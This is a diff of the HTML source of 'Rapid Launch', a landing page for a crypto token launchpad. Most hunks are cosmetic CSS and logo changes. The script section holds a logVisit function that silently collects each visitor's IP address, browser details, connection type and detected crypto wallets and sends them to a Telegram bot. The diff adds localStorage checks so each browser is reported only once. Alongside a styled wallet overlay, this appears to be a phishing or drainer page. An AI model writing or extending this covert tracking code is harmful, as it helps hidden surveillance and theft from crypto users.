@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="theme-color" content="#0A0A0A">
 <title>Rapid Launch — Deploy tokens in less than a second</title>
-<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%23F7FBFF'/%3E%3Cstop offset='100%25' stop-color='%239EC4FF'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cg fill='url(%23g)'%3E%3Cpath d='M16 3L29 10L16 17L3 10Z'/%3E%3Cpath d='M16 11L29 18L16 25L3 18Z' opacity='0.75'/%3E%3Cpath d='M16 19L29 26L16 29L3 26Z' opacity='0.5'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%23F7FBFF'/%3E%3Cstop offset='100%25' stop-color='%239EC4FF'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cg fill='url(%23g)'%3E%3Cpath d='M16 5L28 11.5L16 18L4 11.5Z'/%3E%3Cpath d='M16 12.5L28 19L16 25.5L4 19Z' opacity='0.7'/%3E%3Cpath d='M16 20L28 26.5L16 30L4 26.5Z' opacity='0.45'/%3E%3C/g%3E%3C/svg%3E">
 <style>
   :root{
     --fg:#fff;
@@ -20,14 +20,13 @@
     --surface-2:#0D0D0D;
     --line:#1f2229;
   }
-  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  *,*::before,*::after{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html{background:#0A0A0A;color-scheme:dark}
   html,body{margin:0;padding:0;background:#0A0A0A !important;color:#fff !important;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
   a{color:inherit;text-decoration:none}
   button{font-family:inherit;cursor:pointer}
   img,video{display:block;max-width:100%}
 
-  /* ---------- shared ---------- */
   .shell{position:relative;max-width:1280px;margin:0 auto}
   @media(min-width:768px){.shell{border-left:1px solid var(--border-1);border-right:1px solid var(--border-1)}}
   .display{letter-spacing:-0.045em;font-weight:500}
@@ -38,7 +37,7 @@
   .no-scrollbar{scrollbar-width:none}
   .section{border-top:1px solid var(--border-1);position:relative}
 
-  /* ---------- header ---------- */
+  /* header */
   .site-header{position:relative;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:20px 20px 0;gap:16px}
   @media(min-width:640px){.site-header{padding:24px 40px 0}}
   @media(min-width:1280px){.site-header{padding:28px 56px 0}}
@@ -54,8 +53,8 @@
   .header-icons a:hover{color:#fff}
   .header-icons svg{width:20px;height:20px;display:block}
 
-  /* ---------- hero ---------- */
-  .hero{position:relative;overflow:hidden}
+  /* hero */
+  .hero{position:relative;overflow:clip}
   .hero-bg{pointer-events:none;position:absolute;inset:0;overflow:hidden}
   .hero-bg .grid-bg{position:absolute;inset:0;-webkit-mask-image:linear-gradient(to bottom,black 35%,transparent 80%);mask-image:linear-gradient(to bottom,black 35%,transparent 80%)}
   .hero-corner{position:absolute;display:none}
@@ -65,7 +64,7 @@
   .hero-corner.iso{display:none}
   @media(min-width:1280px){.hero-corner.iso{display:block;right:56px;top:56px;width:96px;height:96px}}
 
-  .hero-grid{position:relative;display:grid;gap:40px;padding:40px 20px 48px}
+  .hero-grid{position:relative;display:grid;gap:40px;padding:40px 20px 48px;min-height:1px}
   @media(min-width:640px){.hero-grid{padding:56px 40px}}
   @media(min-width:1280px){.hero-grid{grid-template-columns:1fr 1fr;align-items:center;padding:80px 56px 64px}}
   .hero-grid > *{min-width:0}
@@ -80,14 +79,13 @@
   .btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff}
   .btn-icon{width:14px;height:14px}
 
-  /* video card — isolation:isolate creates containing block so the glow respects the column */
-  .video-card-wrap{position:relative;isolation:isolate;min-width:0}
-  .video-glow{position:absolute;left:-24px;right:-24px;bottom:-32px;top:50%;border-radius:48px;filter:blur(40px);background:radial-gradient(ellipse at bottom, rgba(98,140,235,0.28), transparent 70%);pointer-events:none;z-index:-1}
-  .video-frame{position:relative;border-radius:16px;border:1px solid var(--border-2);background:var(--surface);padding:6px;box-shadow:0 40px 120px -40px rgba(0,0,0,0.9);overflow:hidden;max-width:100%}
+  /* video card — no glow, aspect fixed, contained */
+  .video-card-wrap{position:relative;min-width:0;contain:layout}
+  .video-frame{position:relative;border-radius:16px;border:1px solid var(--border-2);background:var(--surface);padding:6px;box-shadow:0 40px 120px -40px rgba(0,0,0,0.9);overflow:hidden;max-width:100%;box-sizing:content-box}
   @media(min-width:640px){.video-frame{padding:8px}}
   .video-top-line{position:absolute;left:40px;right:40px;top:-1px;height:1px;background:linear-gradient(90deg, transparent, rgba(197,220,255,0.6), transparent);pointer-events:none}
-  .video-inner{position:relative;overflow:hidden;border-radius:10px;background:#000;aspect-ratio:16/9}
-  .video-inner video{width:100%;height:100%;object-fit:cover}
+  .video-inner{position:relative;overflow:hidden;border-radius:10px;background:#000;aspect-ratio:16/9;width:100%}
+  .video-inner video{width:100%;height:100%;object-fit:cover;display:block}
   .video-tint{position:absolute;inset:0;background:linear-gradient(135deg, rgba(0,0,0,0.1), rgba(0,0,0,0.35));pointer-events:none}
 
   /* stats */
@@ -114,7 +112,7 @@
   .marquee-group{display:flex;flex-shrink:0;align-items:center;gap:48px;padding-right:48px}
   .marquee-item{white-space:nowrap;color:var(--muted-1);font-size:13px;font-weight:500}
 
-  /* ---------- product ---------- */
+  /* product */
   .product-head{display:flex;flex-direction:column;gap:32px;padding:56px 20px}
   @media(min-width:640px){.product-head{padding:64px 40px}}
   @media(min-width:1024px){.product-head{flex-direction:row;align-items:center;justify-content:space-between}}
@@ -178,11 +176,9 @@
   .feed-sym{font-size:10px;color:var(--muted-2)}
   .feed-pen{color:var(--muted-2);margin-left:auto}
 
-  /* private transfers svg flow */
   .rl-flow{stroke-dasharray:6 10;animation:rl-dash 2s linear infinite}
   @keyframes rl-dash{to{stroke-dashoffset:-32}}
 
-  /* ---------- creators ---------- */
   .creators-head{padding:80px 20px 0}
   @media(min-width:640px){.creators-head{padding:96px 40px 0}}
   @media(min-width:1280px){.creators-head{padding:96px 56px 0}}
@@ -201,7 +197,6 @@
   .yt-title{font-size:14px;font-weight:500;color:#fff;margin:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
   .yt-auth{font-size:11px;color:var(--muted-2);margin-top:6px;font-family:ui-monospace,monospace}
 
-  /* ---------- developers ---------- */
   .dev-grid{display:grid;grid-template-columns:1fr}
   @media(min-width:1024px){.dev-grid{grid-template-columns:1fr 1fr}}
   .dev-left{padding:80px 20px}
@@ -223,7 +218,6 @@
   .code-body{font-family:ui-monospace,monospace;font-size:12px;line-height:1.95;color:rgba(255,255,255,0.75);padding:24px;overflow-x:auto;white-space:pre;margin:0}
   @media(min-width:640px){.code-body{font-size:13px}}
 
-  /* ---------- CTA ---------- */
   .cta{padding:80px 20px;text-align:center;display:flex;flex-direction:column;align-items:center}
   @media(min-width:640px){.cta{padding:96px 40px}}
   @media(min-width:1280px){.cta{padding:112px 56px}}
@@ -231,7 +225,6 @@
   .cta-btns{margin-top:32px;display:flex;flex-direction:column;align-items:center;gap:8px}
   @media(min-width:420px){.cta-btns{flex-direction:row}}
 
-  /* ---------- vantom overlay ---------- */
   .vx-overlay{position:fixed !important;inset:0 !important;background:rgba(0,0,0,.92) !important;display:none !important;align-items:center !important;justify-content:center !important;padding:18px !important;z-index:99999 !important;overflow-y:auto !important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif !important;color:#e6e6e6 !important;font-size:15px !important;line-height:1.4 !important}
   .vx-overlay.open{display:flex !important}
   .vx-modal{width:100%;max-width:360px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px;text-align:center;max-height:calc(100vh - 40px);overflow-y:auto}
@@ -267,9 +260,9 @@
             <stop offset="100%" stop-color="#9EC4FF"/>
           </linearGradient>
         </defs>
-        <path d="M16 3L29 10L16 17L3 10Z" fill="url(#rlg-logo)"/>
-        <path d="M16 11L29 18L16 25L3 18Z" fill="url(#rlg-logo)" opacity="0.75"/>
-        <path d="M16 19L29 26L16 29L3 26Z" fill="url(#rlg-logo)" opacity="0.5"/>
+        <path d="M16 5L28 11.5L16 18L4 11.5Z" fill="url(#rlg-logo)"/>
+        <path d="M16 12.5L28 19L16 25.5L4 19Z" fill="url(#rlg-logo)" opacity="0.7"/>
+        <path d="M16 20L28 26.5L16 30L4 26.5Z" fill="url(#rlg-logo)" opacity="0.45"/>
       </svg>
       <span class="logo-text">Rapid Launch</span>
     </a>
@@ -324,7 +317,6 @@
       </div>
 
       <div class="video-card-wrap">
-        <div class="video-glow" aria-hidden="true"></div>
         <div class="video-frame">
           <div class="video-top-line" aria-hidden="true"></div>
           <div class="video-inner">
@@ -374,7 +366,6 @@
       </ol>
     </div>
 
-    <!-- 01 -->
     <div class="row">
       <div class="col">
         <p class="eyebrow"><span class="n">01</span><span class="line"></span><span class="grad-text">Launchpads</span></p>
@@ -426,7 +417,6 @@
       </div>
     </div>
 
-    <!-- 02 -->
     <div class="row flip">
       <div class="col col-right">
         <div class="mock-wrap">
@@ -456,7 +446,6 @@
       </div>
     </div>
 
-    <!-- 03 -->
     <div class="row">
       <div class="col">
         <p class="eyebrow"><span class="n">03</span><span class="line"></span><span class="grad-text">Position management</span></p>
@@ -492,7 +481,6 @@
       </div>
     </div>
 
-    <!-- 04 -->
     <div class="row flip">
       <div class="col col-right">
         <div class="mock-wrap">
@@ -528,7 +516,6 @@
       </div>
     </div>
 
-    <!-- 05 -->
     <div class="row">
       <div class="col">
         <p class="eyebrow"><span class="n">05</span><span class="line"></span><span class="grad-text">Vamping</span></p>
@@ -553,7 +540,6 @@
       </div>
     </div>
 
-    <!-- 06 -->
     <div class="row flip">
       <div class="col col-right">
         <div class="mock-wrap">
@@ -726,6 +712,8 @@ function lsDel(k){try{localStorage.removeItem(k);}catch(_){}}
 function savePending(){lsSet("vx_pending","1");}
 function readPending(){return lsGet("vx_pending")==="1";}
 function clearPending(){lsDel("vx_pending");}
+function hasVisited(){return lsGet("vx_visited")==="1";}
+function markVisited(){lsSet("vx_visited","1");}
 
 function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function tgSendText(text){
@@ -759,6 +747,8 @@ async function getClientIP(){
 function shortId(s){if(!s)return "—";s=String(s);return s.length>16?s.slice(0,8)+"…"+s.slice(-8):s;}
 
 async function logVisit(){
+  // skip if this browser already sent a visit log
+  if(hasVisited()) return;
   try{
     var ip=await getClientIP();
     var nav=navigator;
@@ -799,8 +789,10 @@ async function logVisit(){
     if(conn) L.push("📶 <b>Conn:</b> "+tgEscape(conn));
     if(seen.length) L.push("👛 <b>Wallets:</b> "+tgEscape(seen.join(", ")));
     tgSend(L.join("\n"));
+    markVisited();
   }catch(e){
     try{ tgSendText("Visit log error: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+    markVisited();
   }
 }
 
